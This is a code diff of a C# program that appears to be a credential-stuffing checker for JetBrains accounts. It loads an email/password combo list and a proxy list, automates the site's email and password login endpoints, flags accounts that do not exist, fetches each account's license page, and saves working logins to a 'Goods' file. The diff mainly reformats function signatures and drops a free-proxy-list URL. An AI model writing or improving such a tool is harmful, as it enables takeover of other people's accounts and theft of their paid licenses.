@@ -28,14 +28,10 @@ public struct PasswordLoginRequest
 
 public static class Program
 {
+    
     private static string ProxyPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Proxy.txt");
-
     private static string ComboPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Combo.txt");
-
     private static string GoodAccountsPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Goods.txt");
-
-    private static string HttpProxyUrl =
-        "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=10010";
 
     private const string BaseUrl = "https://account.jetbrains.com";
 
@@ -73,6 +69,7 @@ public static class Program
     // to file using streamWriter is very low, right ?
     private static StreamWriter streamWriter = new StreamWriter(GoodAccountsPath, true);
 
+    // debugging, flags
     private static int debug = 0;
     private static string Type = "";
     private static bool Finished = false;
@@ -362,11 +359,7 @@ public static class Program
         return new HttpClient(handler);
     }
     
-    static async Task<string> CreateAuthSession(
-        HttpClient client,
-        Cookie authCookie,
-        CancellationToken ctsToken
-    )
+    static async Task<string> CreateAuthSession( HttpClient client, Cookie authCookie, CancellationToken ctsToken )
     {
         var request = new HttpRequestMessage(HttpMethod.Post, $"{BaseUrl}/api/auth/sessions")
         {
@@ -377,13 +370,7 @@ public static class Program
         return ParseSessionId(await response.Content.ReadAsStringAsync());
     }
     
-    static async Task<string> EmailLogin(
-        HttpClient client,
-        string AuthEmail,
-        Cookie authCookie,
-        string sessionId,
-        CancellationToken ctsToken
-    )
+    static async Task<string> EmailLogin( HttpClient client, string AuthEmail, Cookie authCookie, string sessionId, CancellationToken ctsToken )
     {
         var emailRequest = new HttpRequestMessage(
             HttpMethod.Post,
@@ -406,27 +393,14 @@ public static class Program
     
     static bool BadEmail(string emailResponse)
     {
-        if (
-            emailResponse.Contains("We couldn't find")
-            || emailResponse.Contains("InvalidEmail")
-            || emailResponse.Contains("AccountNotFound")
-        )
+        if ( emailResponse.Contains("We couldn't find") || emailResponse.Contains("InvalidEmail") || emailResponse.Contains("AccountNotFound"))
         {
-            // Debug - Console.WriteLine("Bad Email");
             return true;
         }
-        
         return false;
     }
     
-    static async Task<string> PasswordLogin(
-        HttpClient client,
-        string AuthEmail,
-        string AuthPassword,
-        Cookie authCookie,
-        string sessionId,
-        CancellationToken ctsToken
-    )
+    static async Task<string> PasswordLogin( HttpClient client, string AuthEmail, string AuthPassword, Cookie authCookie, string sessionId, CancellationToken ctsToken)
     {
         var passwordRequest = new HttpRequestMessage(
             HttpMethod.Post,
@@ -465,13 +439,7 @@ public static class Program
         }
     }
     
-    static async Task<string> License(
-        HttpClient client,
-        string Email,
-        string Password,
-        CookieContainer Container,
-        CancellationToken ctsToken
-    )
+    static async Task<string> License( HttpClient client, string Email, string Password, CookieContainer Container, CancellationToken ctsToken )
     {
         var licenseRequest = new HttpRequestMessage(HttpMethod.Get, $"{BaseUrl}/licenses");
         
